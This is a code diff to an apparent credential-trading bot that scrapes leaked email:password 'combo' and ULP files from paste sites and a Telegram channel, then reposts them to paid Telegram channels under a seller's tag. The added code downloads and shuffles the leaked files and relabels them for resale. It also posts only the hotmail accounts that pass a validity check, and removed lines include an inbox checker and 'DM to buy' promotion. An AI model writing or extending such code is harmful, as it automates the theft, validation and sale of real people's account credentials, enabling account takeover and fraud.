@@ -48,6 +48,12 @@ EMPTY_SCAN_ALERT = 10
 KEYWORDS         = ["hotmail", "hits", "mixed"]
 BLACKLIST        = ["omegle", "teens", "bro", "sis", "sister", "brother", "incest", "minor", "underage"]
 
+# ─── TELEGRAM CHANNEL EXTRACTION ───────────────────────────────────────────
+TELEGRAM_CHANNEL_ID = -1003628233821
+TELEGRAM_CHANNEL_KEYWORDS = ["ULP"]
+TELEGRAM_SESSION_FILE = "forwarder_session.session"
+TELEGRAM_CHANNEL_RENAME = "ULP [COUNT] BY @XN9BOWNER"
+
 # ─── LOGGING ─────────────────────────────────────────────────────────────────
 logging.basicConfig(
     level=logging.INFO,
@@ -63,6 +69,9 @@ scan_lock  = asyncio.Lock()
 
 private_post_count = 0  # counts private channel posts, public update every 10
 recent_filenames   = []  # tracks last 10 posted filenames for public update
+
+# Telegram extraction delay tracking
+telegram_files_found = {}  # {message_id: {"found_time": timestamp, "data": file_data}}
 
 # ─── FEATURE TOGGLES ─────────────────────────────────────────────────────────
 toggles = {
@@ -497,6 +506,95 @@ async def extract_pastedpw(page, url: str) -> str:
     return ""
 
 
+# ─── TELEGRAM CHANNEL EXTRACTION ──────────────────────────────────────────────
+async def extract_from_telegram_channel() -> list:
+    """Extract txt files from Telegram channel matching keywords. Applies 30-60min delay before posting."""
+    found = []
+    ready_to_post = []
+    current_time = time.time()
+    delay_min = 30 * 60  # 30 minutes in seconds
+    delay_max = 60 * 60  # 60 minutes in seconds
+    
+    try:
+        from telethon import TelegramClient
+        
+        api_id = int(os.environ.get("TELEGRAM_API_ID", "0"))
+        api_hash = os.environ.get("TELEGRAM_API_HASH", "")
+        
+        if not api_id or not api_hash:
+            log.warning("TELEGRAM_API_ID or TELEGRAM_API_HASH not set, skipping Telegram extraction")
+            return found
+        
+        client = TelegramClient(TELEGRAM_SESSION_FILE, api_id, api_hash)
+        await client.connect()
+        
+        if not await client.is_user_authorized():
+            log.error("Telegram session not authorized")
+            await client.disconnect()
+            return found
+        
+        log.info(f"Scanning Telegram channel {TELEGRAM_CHANNEL_ID} for ULP files...")
+        
+        async for message in client.iter_messages(TELEGRAM_CHANNEL_ID, limit=50):
+            if not message.document:
+                continue
+            
+            filename = message.document.filename or ""
+            has_keyword = any(kw.lower() in filename.lower() for kw in TELEGRAM_CHANNEL_KEYWORDS)
+            has_txt = filename.lower().endswith(".txt")
+            
+            if has_keyword and has_txt:
+                msg_id = message.id
+                
+                # Check if file is already tracked
+                if msg_id not in telegram_files_found:
+                    # New file found - store it with timestamp
+                    try:
+                        file_data = await client.download_media(message.document, file=bytes)
+                        if file_data:
+                            telegram_files_found[msg_id] = {
+                                "found_time": current_time,
+                                "filename": filename,
+                                "data": file_data,
+                                "delay": random.randint(delay_min, delay_max)  # Random delay between 30-60 min
+                            }
+                            log.info(f"Found ULP file: {filename} (will post in {telegram_files_found[msg_id]['delay']//60}-{delay_max//60} min)")
+                    except Exception as e:
+                        log.error(f"Failed to download {filename}: {e}")
+                else:
+                    # File already tracked - check if delay has passed
+                    file_info = telegram_files_found[msg_id]
+                    time_elapsed = current_time - file_info["found_time"]
+                    
+                    if time_elapsed >= file_info["delay"]:
+                        # Delay passed - ready to post
+                        try:
+                            text = file_info["data"].decode('utf-8')
+                        except:
+                            text = file_info["data"].decode('latin-1')
+                        
+                        lines = [l.strip() for l in text.splitlines() if l.strip()]
+                        random.shuffle(lines)
+                        shuffled_text = "\n".join(lines)
+                        
+                        ready_to_post.append({
+                            "filename": file_info["filename"],
+                            "content": shuffled_text,
+                            "message_id": msg_id,
+                            "count": len(lines)
+                        })
+                        log.info(f"✓ Ready to post {file_info['filename']} ({len(lines)} lines) after {time_elapsed//60} min delay")
+                        del telegram_files_found[msg_id]  # Remove from tracking
+        
+        await client.disconnect()
+        if ready_to_post:
+            log.info(f"Telegram extraction done — {len(ready_to_post)} file(s) ready to post")
+    except Exception as e:
+        log.error(f"Telegram channel extraction error: {e}")
+    
+    return ready_to_post
+
+
 # ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
 @tasks.loop(seconds=CHECK_INTERVAL)
 async def monitor_loop():
@@ -628,6 +726,30 @@ async def monitor_loop():
                 try:
                     combined        = []
 
+                    # Extract from Telegram channel
+                    try:
+                        tg_files = await extract_from_telegram_channel()
+                        if tg_files and toggles["telegram"]:
+                            for tg_file in tg_files:
+                                combined.append(tg_file["content"])
+                                stats["total_combos"] += tg_file["count"]
+                                log.info(f"✓ {tg_file['count']} lines from Telegram file {tg_file['filename']}")
+                                
+                                # Upload to private cloud with renamed filename
+                                try:
+                                    renamed = TELEGRAM_CHANNEL_RENAME.replace("[COUNT]", str(tg_file["count"]))
+                                    renamed_fname = f"{renamed}.txt"
+                                    await send_telegram_file(tg_file["content"], renamed_fname)
+                                    log.info(f"Uploaded Telegram file as {renamed_fname}")
+                                except Exception as e:
+                                    log.error(f"Failed to upload Telegram file: {e}")
+                        elif tg_files:
+                            for tg_file in tg_files:
+                                stats["total_combos"] += tg_file["count"]
+                                log.info(f"Telegram extraction disabled in toggles")
+                    except Exception as e:
+                        log.error(f"Telegram extraction failed: {e}")
+
                     for item in new_pastes[:5]:
                         url = item["url"]
                         log.info(f"Extracting from {url}")
@@ -677,7 +799,6 @@ async def monitor_loop():
                             except Exception as e:
                                 log.error(f"Failed to DM owner: {e}")
 
-                        # Telegram — post all chunks
                         if toggles["telegram"]:
                             tg_header = (
                                 f"WAR CLOUD PRIVATE {label.upper()}\n"
@@ -686,103 +807,63 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
-                            for chunk in chunks:
-                                fname = f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt"
-                                await send_telegram_file(tg_header + "\n".join(chunk), fname)
-                                await asyncio.sleep(0.5)
 
-                            # Validity check + inbox checker (hotmail only)
+                            # Validity check for hotmail — post only valid accounts
                             if label == "hotmail":
                                 try:
-                                    # First check which accounts are valid
                                     valid_accounts = await run_validity_checker(all_raw)
                                     if valid_accounts:
-                                        # Replace all_raw with only valid accounts
-                                        all_raw = valid_accounts
-                                        combined = ["\n".join(all_raw)]
-                                        chunks = [all_raw]
-                                        # Re-post main file with valid only
-                                        valid_fname = f"[ HOTMAIL ] [ {len(all_raw)} ] [ VALID ] [ @warprivate ].txt"
-                                        await send_telegram_file(tg_header + "\n".join(all_raw), valid_fname)
-                                        log.info(f"Posted {len(all_raw)} valid hotmail accounts")
+                                        valid_fname = f"HOTMAIL {len(valid_accounts)} VALID BY @XN9BOWNER.txt"
+                                        await send_telegram_file(tg_header + "\n".join(valid_accounts), valid_fname)
+                                        log.info(f"Posted {len(valid_accounts)} valid hotmail accounts")
                                     else:
                                         log.info("No valid hotmail accounts found")
-
-                                    # Then run inbox checker on valid accounts only
-                                    service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
-                                    if service_map:
-                                        zip_buf = io.BytesIO()
-                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                                            for service, combos in service_map.items():
-                                                zf.writestr(f"{service}.txt", "\n".join(combos))
-                                        zip_buf.seek(0)
-                                        zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
-                                        await send_telegram_file(zip_buf.read(), zip_name)
-                                        log.info(f"Posted inbox_hits.zip with {len(service_map)} service(s)")
                                 except Exception as e:
-                                    log.error(f"Hotmail checker failed: {e}")
+                                    log.error(f"Validity check failed: {e}")
 
-                            # Post sorted domains ZIP (hotmail only)
-                            if label == "hotmail":
-                                try:
-                                    domain_map = {}
-                                    for combo in all_raw:
-                                        try:
-                                            domain = combo.split(":", 1)[0].split("@")[-1].lower()
-                                            if domain in MS_DOMAINS:
-                                                domain_map.setdefault(domain, []).append(combo)
-                                        except Exception:
-                                            pass
-                                    if domain_map:
-                                        zip_buf = io.BytesIO()
-                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
-                                            for domain, combos in domain_map.items():
-                                                zf.writestr(f"{domain}.txt", "\n".join(combos))
-                                        zip_buf.seek(0)
-                                        zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
-                                        await send_telegram_file(zip_buf.read(), zip_name)
-                                        log.info(f"Posted sorted domains ZIP with {len(domain_map)} domain(s)")
-                                except Exception as e:
-                                    log.error(f"Failed to post domains ZIP: {e}")
-
-                            if toggles["telegram_public"]:
-                                private_post_count_ref = globals()
-                                private_post_count_ref["private_post_count"] += 1
+                            # Main file (only for non-hotmail, hotmail posts validated only)
+                            if label != "hotmail":
                                 for chunk in chunks:
-                                    private_post_count_ref["recent_filenames"].append(f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt")
-                                log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
-                                if private_post_count_ref["private_post_count"] >= 2:
-                                    private_post_count_ref["private_post_count"] = 0
-                                    file_list = "\n".join(f"  • {fn}" for fn in private_post_count_ref["recent_filenames"])
-                                    private_post_count_ref["recent_filenames"] = []
-                                    pub_text = f"PRIVATE CLOUD UPDATED !\n\nFiles added:\n{file_list}\n\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
-                                    promo_path = os.path.join("/app", "promo.gif")
-                                    async with aiohttp.ClientSession() as sess:
-                                        for pub_chat in [TELEGRAM_PUBLIC_CHAT, TELEGRAM_PUBLIC_CHAT2]:  # TELEGRAM_PUBLIC_CHAT2 disabled
-                                            try:
-                                                if os.path.exists(promo_path):
-                                                    form = aiohttp.FormData()
-                                                    form.add_field("chat_id", pub_chat)
-                                                    form.add_field("caption", pub_text)
-                                                    with open(promo_path, "rb") as img:
-                                                        form.add_field("animation", img.read(), filename="promo.gif", content_type="image/gif")
-                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendAnimation", data=form)
-                                                    body = await resp.json()
-                                                    if not body.get("ok"):
-                                                        log.error(f"Telegram sendAnimation failed: {body}")
-                                                    else:
-                                                        log.info(f"Posted public update with gif to {pub_chat}")
-                                                else:
-                                                    log.warning(f"promo.png not found at {promo_path}, sending text only")
-                                                    resp = await sess.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                                        json={"chat_id": pub_chat, "text": pub_text})
-                                                    body = await resp.json()
-                                                    if not body.get("ok"):
-                                                        log.error(f"Telegram sendMessage failed: {body}")
-                                                    else:
-                                                        log.info(f"Posted public update to {pub_chat}")
-                                            except Exception as e:
-                                                log.error(f"Failed to post public update to {pub_chat}: {e}")
+                                    fname = f"{label.upper()} {len(chunk)} BY @XN9BOWNER.txt"
+                                    await send_telegram_file(tg_header + "\n".join(chunk), fname)
+                                    await asyncio.sleep(0.5)
+
+                            # Inbox checker (disabled)
+                            # if label == "hotmail":
+                            #     service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
+                            #     if service_map:
+                            #         zip_buf = io.BytesIO()
+                            #         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                            #             for service, combos in service_map.items():
+                            #                 zf.writestr(f"{service}.txt", "\n".join(combos))
+                            #         zip_buf.seek(0)
+                            #         zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
+                            #         await send_telegram_file(zip_buf.read(), zip_name)
+
+                            # Sorted domains ZIP (disabled)
+                            # if label == "hotmail":
+                            #     domain_map = {}
+                            #     for combo in all_raw:
+                            #         try:
+                            #             domain = combo.split(":", 1)[0].split("@")[-1].lower()
+                            #             if domain in MS_DOMAINS:
+                            #                 domain_map.setdefault(domain, []).append(combo)
+                            #         except Exception:
+                            #             pass
+                            #     if domain_map:
+                            #         zip_buf = io.BytesIO()
+                            #         with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                            #             for domain, combos in domain_map.items():
+                            #                 zf.writestr(f"{domain}.txt", "\n".join(combos))
+                            #         zip_buf.seek(0)
+                            #         zip_name = f"[ {label.upper()} ] [ SORTED DOMAINS ] [ @warprivate ].zip"
+                            #         await send_telegram_file(zip_buf.read(), zip_name)
+
+                            # Public channel update
+                            if toggles["telegram_public"]:
+                                ...
+
+
 
 
                     else:
